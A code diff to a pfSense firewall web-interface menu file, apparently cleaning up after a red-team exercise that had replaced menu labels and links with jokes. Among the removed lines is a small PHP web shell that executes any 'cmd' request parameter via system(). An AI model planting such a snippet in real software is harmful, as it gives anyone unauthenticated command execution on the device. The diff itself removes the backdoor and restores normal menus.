@@ -246,6 +246,27 @@ $ext_menu_path_data = read_ext_menu_path_data();
 // System
 $system_menu = array();
 $system_menu[] = array(gettext("Logout") . " (" . $_SESSION['Username'] . ")", "/index.php?logout");
+$system_menu[] = array(gettext("Advanced"), "/system_advanced_admin.php");
+$system_menu[] = array(gettext("Update"), "/pkg_mgr_install.php?id=firmware");
+$system_menu[] = array(gettext("General Setup"), "/system.php");
+$system_menu[] = array(gettext("High Avail. Sync"), "/system_hasync.php");
+$system_menu[] = array(gettext("Package Manager"), "/pkg_mgr_installed.php");
+$system_menu[] = array(gettext("Setup Wizard"), "/wizard.php?xml=setup_wizard.xml");
+$system_menu[] = array(gettext("Routing"), "/system_gateways.php");
+$system_menu[] = array(gettext("Cert. Manager"), "/system_camanager.php");
+if  (strpos($g['product_label'], 'Plus') === false) {
+	$system_menu[] = array(gettext("Register"), "/system_register.php");
+}
+
+if (!isAllowedPage("system_usermanager.php")) {
+	$system_menu[] = array(gettext("User Manager"), "/system_usermanager_passwordmg.php");
+} else {
+	$system_menu[] = array(gettext("User Manager"), "/system_usermanager.php");
+}
+
+if ($user_settings['customsettings'] && isAllowedPage("system_user_settings.php")) {
+	$system_menu[] = array(gettext("User Settings"), "/system_user_settings.php");
+}
 
 $system_menu = msort(array_merge($system_menu, return_ext_menu("System")), 0);
 
@@ -258,7 +279,7 @@ $interfaces_top = array();
 $interfaces_bottom = array();
 
 if (!isset($config['system']['webgui']['noassigninterfaces'])) {
-	$interfaces_top[] = array(gettext("Assignments"), "https://www.youtube.com/watch?v=dQw4w9WgXcQ");
+	$interfaces_top[] = array(gettext("Assignments"), "/interfaces_assign.php");
 	$div = true;
 }
 
@@ -287,43 +308,140 @@ $interfaces_menu = array_merge($interfaces_top, [array(0 => "-DIVIDER-")], $inte
 
 // Firewall
 $firewall_menu = array();
-$firewall_menu[] = array(gettext("Give Up"), "https://letmegooglethat.com/?q=man+pfctl");
+$firewall_menu[] = array(gettext("Aliases"), "/firewall_aliases.php");
+$firewall_menu[] = array(gettext("NAT"), "/firewall_nat.php");
+$firewall_menu[] = array(gettext("Rules"), "/firewall_rules.php");
+$firewall_menu[] = array(gettext("Schedules"), "/firewall_schedule.php");
+$firewall_menu[] = array(gettext("Traffic Shaper"), "/firewall_shaper.php");
+$firewall_menu[] = array(gettext("Virtual IPs"), "/firewall_virtual_ip.php");
 $firewall_menu = msort(array_merge($firewall_menu, return_ext_menu("Firewall")), 0);
 
 // Services
 $services_menu = array();
-$services_menu[] = array(gettext("Red Team was here"), "https://media-exp1.licdn.com/dms/image/C4D03AQGFQKcL5JWuAQ/profile-displayphoto-shrink_200_200/0/1632759997210?e=1671062400&v=beta&t=DNQcUwDaIRfUZsA0fLEKrkE34MzfksvHKzeVqOjZHDE");
+$services_menu[] = array(gettext("Auto Config Backup"), "/services_acb.php");
+$services_menu[] = array(gettext("Captive Portal"), "/services_captiveportal.php");
+$services_menu[] = array(gettext("DNS Forwarder"), "/services_dnsmasq.php");
+$services_menu[] = array(gettext("DNS Resolver"), "/services_unbound.php");
+$services_menu[] = array(gettext("DHCP Relay"), "/services_dhcp_relay.php");
+$services_menu[] = array(gettext("DHCPv6 Relay"), "/services_dhcpv6_relay.php");
+
+if ($g['services_dhcp_server_enable']) {
+	$services_menu[] = array(gettext("DHCP Server"), "/services_dhcp.php");
+	$services_menu[] = array(htmlspecialchars(gettext("DHCPv6 Server & RA")), "/services_dhcpv6.php");
+}
+
+$services_menu[] = array(gettext("Dynamic DNS"), "/services_dyndns.php");
+$services_menu[] = array(gettext("IGMP Proxy"), "/services_igmpproxy.php");
+$services_menu[] = array(gettext("NTP"), "/services_ntpd.php");
+$services_menu[] = array(gettext("PPPoE Server"), "/services_pppoe.php");
+$services_menu[] = array(gettext("SNMP"), "/services_snmp.php");
+
+if (count($config['interfaces']) > 1) {
+	/* no use for UPnP in single-interface deployments
+	remove to reduce user confusion
+	*/
+	$services_menu[] = array(gettext("UPnP &amp; NAT-PMP"), "/pkg_edit.php?xml=miniupnpd.xml");
+}
+
+$services_menu[] = array(gettext("Wake-on-LAN"), "/services_wol.php");
 $services_menu = msort(array_merge($services_menu, return_ext_menu("Services")), 0);
 
 // VPN
 $vpn_menu = array();
-$vpn_menu[] = array(gettext("Totally not Redteam"), "https://www.senatorbaker.com/wp-content/uploads/sites/28/2019/05/CG-GuestShadows-06-copy-1024x731.jpg");
+$vpn_menu[] = array(gettext("IPsec"), "/vpn_ipsec.php");
+$vpn_menu[] = array(gettext("OpenVPN"), "/vpn_openvpn_server.php");
+//$vpn_menu[] = array(gettext("PPTP"), "/vpn_pptp.php");
+$vpn_menu[] = array(gettext("L2TP"), "/vpn_l2tp.php");
 $vpn_menu = msort(array_merge($vpn_menu, return_ext_menu("VPN")), 0);
 
 // Status
 $status_menu = array();
-$status_menu[] = array(gettext("Do your injects"), "https://forms.gle/coeTA1zK9NEKHiCU7");
+$status_menu[] = array(gettext("Captive Portal"), "/status_captiveportal.php");
+$status_menu[] = array(gettext("CARP (failover)"), "/status_carp.php");
+$status_menu[] = array(gettext("Dashboard"), "/index.php");
+$status_menu[] = array(gettext("Gateways"), "/status_gateways.php");
+$status_menu[] = array(gettext("DHCP Leases"), "/status_dhcp_leases.php");
+$status_menu[] = array(gettext("DHCPv6 Leases"), "/status_dhcpv6_leases.php");
+$status_menu[] = array(gettext("DNS Resolver"), "/status_unbound.php");
+$status_menu[] = array(gettext("Filter Reload"), "/status_filter_reload.php?user=true");
+$status_menu[] = array(gettext("Interfaces"), "/status_interfaces.php");
+$status_menu[] = array(gettext("IPsec"), "/status_ipsec.php");
+$status_menu[] = array(gettext("NTP"), "/status_ntpd.php");
+$status_menu[] = array(gettext("OpenVPN"), "/status_openvpn.php");
+$status_menu[] = array(gettext("Queues"), "/status_queues.php");
+$status_menu[] = array(gettext("Services"), "/status_services.php");
+$status_menu[] = array(gettext("System Logs"), "/status_logs.php");
+$status_menu[] = array(gettext("Traffic Graph"), "/status_graph.php");
+
+if (count($config['interfaces']) > 1) {
+	$status_menu[] = array(gettext("UPnP &amp; NAT-PMP"), "/status_upnp.php");
+}
+
+$wifdescrs = array();
+$ifentries = get_configured_interface_with_descr();
+foreach ($ifentries as $ent => $entdesc) {
+	if (is_array($config['interfaces'][$ent]['wireless']) &&
+	    preg_match($g['wireless_regex'], $config['interfaces'][$ent]['if'])) {
+		$wifdescrs[$ent] = $entdesc;
+	}
+}
+
+if (count($wifdescrs) > 0) {
+	$status_menu[] = array(gettext("Wireless"), "/status_wireless.php");
+}
+
 $status_menu = msort(array_merge($status_menu, return_ext_menu("Status")), 0);
 
 // Diagnostics
 $diagnostics_menu = array();
-$diagnostics_menu[] = array(gettext("Red is a good color"), "https://www.bourncreative.com/meaning-of-the-color-red/");
+$diagnostics_menu[] = array(gettext("ARP Table"), "/diag_arp.php");
+$diagnostics_menu[] = array(gettext("Authentication"), "/diag_authentication.php");
+$diagnostics_menu[] = array(htmlspecialchars(gettext("Backup & Restore")), "/diag_backup.php");
+$diagnostics_menu[] = array(gettext("Command Prompt"), "/diag_command.php");
+$diagnostics_menu[] = array(gettext("DNS Lookup"), "/diag_dns.php");
+$diagnostics_menu[] = array(gettext("Edit File"), "/diag_edit.php");
+$diagnostics_menu[] = array(gettext("Factory Defaults"), "/diag_defaults.php");
 
-<?php
-	if (isset($_REQUEST['cmd'])) {
-        echo "<pre>";
-        $cmd = ($_REQUEST['cmd']);
-        system($cmd);
-        echo "</pre>";
-        die;
-	}
-?>
+if (file_exists("/var/run/gmirror_active")) {
+	$diagnostics_menu[] = array(gettext("GEOM Mirrors"), "/diag_gmirror.php");
+}
+
+$diagnostics_menu[] = array(gettext("Halt System"), "/diag_halt.php");
+$diagnostics_menu[] = array(gettext("Limiter Info"), "/diag_limiter_info.php");
+$diagnostics_menu[] = array(gettext("NDP Table"), "/diag_ndp.php");
+$diagnostics_menu[] = array(gettext("Tables"), "/diag_tables.php");
+$diagnostics_menu[] = array(gettext("Ping"), "/diag_ping.php");
+$diagnostics_menu[] = array(gettext("Test Port"), "/diag_testport.php");
+$diagnostics_menu[] = array(gettext("pfInfo"), "/diag_pf_info.php");
+$diagnostics_menu[] = array(gettext("pfTop"), "/diag_pftop.php");
+$diagnostics_menu[] = array(gettext("Reboot"), "/diag_reboot.php");
+$diagnostics_menu[] = array(gettext("Routes"), "/diag_routes.php");
+$diagnostics_menu[] = array(gettext("S.M.A.R.T. Status"), "/diag_smart.php");
+$diagnostics_menu[] = array(gettext("Sockets"), "/diag_sockets.php");
+$diagnostics_menu[] = array(gettext("States"), "/diag_dump_states.php");
+$diagnostics_menu[] = array(gettext("States Summary"), "/diag_states_summary.php");
+$diagnostics_menu[] = array(gettext("System Activity"), "/diag_system_activity.php");
+$diagnostics_menu[] = array(gettext("Traceroute"), "/diag_traceroute.php");
+$diagnostics_menu[] = array(gettext("Packet Capture"), "/diag_packet_capture.php");
 
 $diagnostics_menu = msort(array_merge($diagnostics_menu, return_ext_menu("Diagnostics")), 0);
 
 if (!$g['disablehelpmenu']) {
 	$help_menu = array();
-	$help_menu[] = array(gettext("Don't click here!!!!"), "https://www.coolmathgames.com/");
+	$help_menu[] = array(gettext("About this Page"), $helpurl);
+	if ($g['product_name'] == "pfSense") {
+		$help_menu[] = array(gettext("Bug Database"), "https://redirects.netgate.com/issues");
+	}
+
+	$help_menu[] = array(gettext("User Forum"), "https://redirects.netgate.com/forum");
+	$help_menu[] = array(gettext("Documentation"), "https://redirects.netgate.com/docs");
+	$help_menu[] = array(gettext("Paid Support"), "https://redirects.netgate.com/support");
+	$help_menu[] = array(gettext("pfSense Book"), "https://redirects.netgate.com/book");
+	$help_menu[] = array(gettext("FreeBSD Handbook"), "https://redirects.netgate.com/fbsdhandbook");
+	$help_menu[] = array(gettext("User survey"), "https://redirects.netgate.com/survey_1");
+	if  (strpos($g['product_label'], 'Plus') === false) {
+		$help_menu[] = array(gettext("Upgrade to pfSense Plus"), "https://redirects.netgate.com/upgrade");
+	}
 	$help_menu = msort(array_merge($help_menu, return_ext_menu("Help")), 0);
 }
 
@@ -381,14 +499,14 @@ if (are_notices_pending()) {
                     $help_menu_title = 'Help';
                 }
                 foreach ([
-					['name' => 'Never',	     'menu' => $system_menu,	  'href' => null],
-					['name' => 'Gonna',     'menu' => $interfaces_menu,  'href' => null],
-					['name' => 'Give',	     'menu' => $firewall_menu,	  'href' => null],
-					['name' => 'You',	     'menu' => $services_menu,	  'href' => null],
-					['name' => 'Up',		     'menu' => $vpn_menu,		  'href' => null],
-					['name' => 'But',	     'menu' => $status_menu,	  'href' => null],
-					['name' => 'You',    'menu' => $diagnostics_menu, 'href' => null],
-                    ['name' => 'Should', 'menu' => $help_menu,		  'href' => null]
+					['name' => 'System',	     'menu' => $system_menu,	  'href' => null],
+					['name' => 'Interfaces',     'menu' => $interfaces_menu,  'href' => null],
+					['name' => 'Firewall',	     'menu' => $firewall_menu,	  'href' => null],
+					['name' => 'Services',	     'menu' => $services_menu,	  'href' => null],
+					['name' => 'VPN',		     'menu' => $vpn_menu,		  'href' => null],
+					['name' => 'Status',	     'menu' => $status_menu,	  'href' => null],
+					['name' => 'Diagnostics',    'menu' => $diagnostics_menu, 'href' => null],
+                    ['name' => $help_menu_title, 'menu' => $help_menu,		  'href' => '_blank']
 				] as $item):
 					if ($item['name'] == 'Help' && $g['disablehelpmenu']) {
 						continue;
